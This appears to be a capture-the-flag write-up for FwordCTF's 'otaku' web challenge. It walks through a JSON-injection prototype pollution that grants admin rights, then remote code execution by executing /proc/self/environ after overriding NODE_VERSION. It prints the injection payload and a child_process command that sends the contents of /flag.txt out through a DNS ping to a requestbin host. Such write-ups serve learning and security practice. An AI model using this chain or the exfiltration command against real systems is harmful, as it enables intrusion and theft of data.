---
layout: post
title: "FwordCTF otaku solution"
date: 2020-09-01
---

The challenge' info card gives us the website's source code and a link to the website itself.

#### Info card:


![infocard](/assets/posts/fwordctf-otaku/images/banner.png)


#### Website's first page:


![foothold](/assets/posts/fwordctf-otaku/images/foothold.PNG)


As you can see, there are login and register buttons so I'm going to create new account.

After creating new account, my homepage looks like this:

#### Home page: 


![homepage](/assets/posts/fwordctf-otaku/images/homepage.png)


#### Update details page: 


![updatepage](/assets/posts/fwordctf-otaku/images/updatepage.png)


The update page lets me update my username and favorite anime, let's read it's source code on src/app.js:

#### Source:


![uploadsource](/assets/posts/fwordctf-otaku/images/uploadsource.png)


The update request uses HTTP post request to send the new username and favorite anime to the server, then it inserts the data unsafely into json string and parse it to the variable `query`.

This unsafe json parse can lead to prototype pollution, because we can inject keys to the json string and `JSON.parse` treats the `__proto__` attribute as regular one and won't drop it.

The server will send our object to Mongo DB, Mongo will return json document which is created by processing a query object and the server will save a copy of the document's keys as a new object, the keys' copy operation will pollute the prototype of newUser.

The new object is going to affect our permissions.

note: We can't inject isAdmin key to the JSON because it will set it to 0 ( src/app.js, line 160), 0 is not admin and we won't get the access.

We should inject the `__proto__` key with object value which contains the key isAdmin with the value 1, `newUser.isAdmin === 1` will result `true` via the prototype chain ([prototype chain](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain)).

Only one problem - Mongo DB drops by default the `__proto__` key from every document. Fortunately, the server use `.trim()` on the document's keys, we can inject `__proto__` with white spaces like `"  __proto__"` , Mongo won't drop it and the `.trim()` will drop the whitespaces. We got prototype pollution, let's build our payload:

The JSON string looks like this :

`{"$set":{"username":"${req.body.username}","anime":"${req.body.anime}"}}`

So we can set the value of anime to

`"," __proto__" : {"isAdmin":1}, "bla":"bla`

Explanation: The first quotation marks used to close anime's quotation marks then we need a comma for next key in JSON.

The `__proto__` key with object value which contains isAdmin key with the value 1 for the prototype pollution and another key-value to close the open quotation marks from the anime, so the JSON string after posting our message will look like this:

`{"$set":{"username":"om3r-v","anime":""," __proto__" : {"isAdmin":1}, "bla":"bla"}}`


After it's sent to the server our session will contain isAdmin value set to 1, so we can access the admin panel (the panel path can be found within the source code: src/app.js , line number 182).

#### admin panel:


![adminpanel](/assets/posts/fwordctf-otaku/images/adminpanel.png)



In the admin panel, we can set arbitrary environment variable of the current process and run js file as a child process using node.


### /proc/self/environ 

`/proc/self/environ` file is a file which contains all the environment variables of the current process. 
 Run this file with node will cause a syntax error because node will try to execute the first line which is probably not a valid javascript.
 Our goal is to causing the first line at /proc/self/environ to look like a valid javascript and it will be executed.

Let's take the docker file from the source code and create a copy of the server's environment.
After building the docker image, let's list the environment variables of the node process:

![envlist](/assets/posts/fwordctf-otaku/images/envlistdocker.png)

The first environment variable is `NODE_VERSION`, we can override it to valid JS code and execute the file `/proc/self/environ` thanks to the admin panel functionality.
Let's try it locally. I copied part of the admin panel' source code to make a PoC.

### local PoC:


![localresearch](/assets/posts/fwordctf-otaku/images/localresearch.PNG)


We got RCE ! the flag is located at /flag.txt (from the challenge's info card), let's receive it with DNSbin.
Admin panel payload:


`envname: NODE_VERSION`

`env: require("child_process").exec("ping -c 1 $(cat /flag.txt).53cddaf08c0b9d06185e.d.requestbin.net");process.exit()//`

`path: /proc/self/environ`

#### before execution:


![before exec](/assets/posts/fwordctf-otaku/images/adminpanel2.PNG)


#### DNSbin result / receiving the flag:


![flag](/assets/posts/fwordctf-otaku/images/dnsbin.PNG)


